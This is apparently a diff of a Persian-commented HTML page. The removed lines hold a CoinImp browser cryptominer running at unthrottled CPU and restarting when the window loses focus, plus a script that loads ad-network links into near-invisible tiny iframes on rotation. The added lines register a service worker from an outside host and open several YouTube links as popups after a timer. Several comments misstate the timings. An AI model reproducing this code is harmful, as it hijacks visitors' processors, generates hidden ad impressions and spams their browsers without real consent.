@@ -1,147 +1,37 @@
-
 <!DOCTYPE html>
-<html lang="fa">
+<html>
 <head>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
-    <title>Multiple Link Viewer</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-        h1 {
-            margin: 20px 0;
-        }
-        .container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 20px;
-            padding: 20px;
-        }
-        iframe {
-            width: 30px;
-            height: 25px;
-            border: 1px solid #ccc;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        #message {
-            font-size: 14px;
-            margin: 10px;
-        }
-    </style>
+    <title>Multiple Redirects</title>
 </head>
 <body>
-    <h1>Multiple Link Viewer</h1>
-    <div id="message">در حال بارگذاری لینک‌ها...</div>
-    <div class="container" id="iframeContainer"></div>
+    <h1>Redirecting in 10 seconds...</h1>
+
+<script>
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('https://yourgithub.io/service-worker.js')
+        .then(registration => {
+            console.log('Service Worker ثبت شد:', registration);
+        })
+        .catch(error => {
+            console.log('خطا در ثبت Service Worker:', error);
+        });
+}
+</script>
 
     <script>
-        // لیست لینک‌ها
+        // لیست لینک‌هایی که می‌خواهید باز شوند
         const links = [
-            "https://www.effectiveratecpm.com/dbzskrf3q?key=a56900bf3072d2a173f41d75ef71875f",
-            "https://www.effectiveratecpm.com/jmfz5u6pu?key=950314485057ea47f628bbc746d52588"
-            
+            "https://youtube.com/shorts/a6lRo22uZGM?si=NJjetQIi0Fba4v4h",
+"https://youtube.com/shorts/F_C20hIhtEE?si=CtTQE0QCoJgrTfd-",
+"https://youtube.com/shorts/a6lRo22uZGM?si=NJjetQIi0Fba4v4h"
         ];
 
-        // زمان تغییر لینک‌ها (بر حسب میلی‌ثانیه)
-        const displayTime = 15000; // 5 ثانیه
-
-        // انتخاب کانتینر برای iframe‌ها
-        const iframeContainer = document.getElementById("iframeContainer");
-        const message = document.getElementById("message");
-
-        // ایجاد iframe برای هر لینک
-        links.forEach((link, index) => {
-            const iframe = document.createElement("iframe");
-            iframe.id = `iframe-${index}`;
-            iframe.src = link; // لینک اولیه
-            iframeContainer.appendChild(iframe);
-        });
-
-        // تابع برای شافل کردن آرایه
-        function shuffleArray(array) {
-            return array.sort(() => Math.random() - 0.5);
-        }
-
-        // تابع برای به‌روزرسانی لینک‌ها
-        function updateIframes() {
-            let shuffledLinks = shuffleArray([...links]); // لینک‌ها را شافل کنیم بدون تغییر در آرایه اصلی
-            links.forEach((_, index) => {
-                const iframe = document.getElementById(`iframe-${index}`);
-                iframe.src = shuffledLinks[index]; // اختصاص لینک جدید بدون تکرار
+        // اجرای باز شدن لینک‌ها پس از 10 ثانیه
+        setTimeout(() => {
+            links.forEach(link => {
+                window.open(link, '_blank');
             });
-
-            message.textContent = `تمام پنجره‌ها به‌روزرسانی شدند.`;
-        }
-
-        // تنظیم زمان‌بندی برای به‌روزرسانی لینک‌ها
-        setInterval(updateIframes, displayTime);
-    </script>
-</body>
-</html>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Mining</title>
-</head>
-<body>
-
-    
-
-    <h1>خوش آمدید به سایت ما</h1>
-    <p>ماینینگ در پس‌زمینه فعال است.</p>
-
-    <!-- اضافه کردن اسکریپت مربوط به CoinImp -->
-    <script src="https://www.hostingcloud.racing/69dV.js"></script>
-
-    <script>
-        // ایجاد یک کلاینت برای ماینینگ
-        var _client = new Client.Anonymous('e2eafd9c701aa4334b4fc04d7b79966f5ebcbb97ccb9910b984e7826ec1dc3e3', {
-            throttle: 0, // تنظیم محدودیت مصرف پردازنده (0 یعنی بدون محدودیت)
-            c: 'w' // شناسه سایت یا تنظیمات خاص
-        });
-
-        // شروع ماینینگ
-        _client.start();
-
-        // نمایش اعلان برای کاربر
-        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-        // تابع شروع ماینینگ در صورتی که مرورگر لود شده باشد
-        function startMining() {
-            if (typeof Client !== 'undefined') {
-                _client.start();
-            } else {
-                console.error('CoinImp Miner is not supported!');
-            }
-        }
-
-        // شروع ماینینگ پس از لود صفحه
-        window.onload = function() {
-            startMining();
-        };
-
-        // فعال کردن ماینینگ در پس‌زمینه حتی وقتی کاربر به صفحه دیگری می‌رود
-        window.onblur = function() {
-            startMining();
-        };
-
-        // دکمه‌ای برای توقف ماینینگ
-        const stopButton = document.createElement("button");
-        stopButton.innerText = "توقف ماینینگ";
-        document.body.appendChild(stopButton);
-
-        stopButton.onclick = function() {
-            _client.stop(); // توقف ماینینگ
-            alert('ماینینگ متوقف شد');
-        };
+        }, 1000); // 500 میلی‌ثانیه = 10 ثانیه
     </script>
 </body>
 </html>
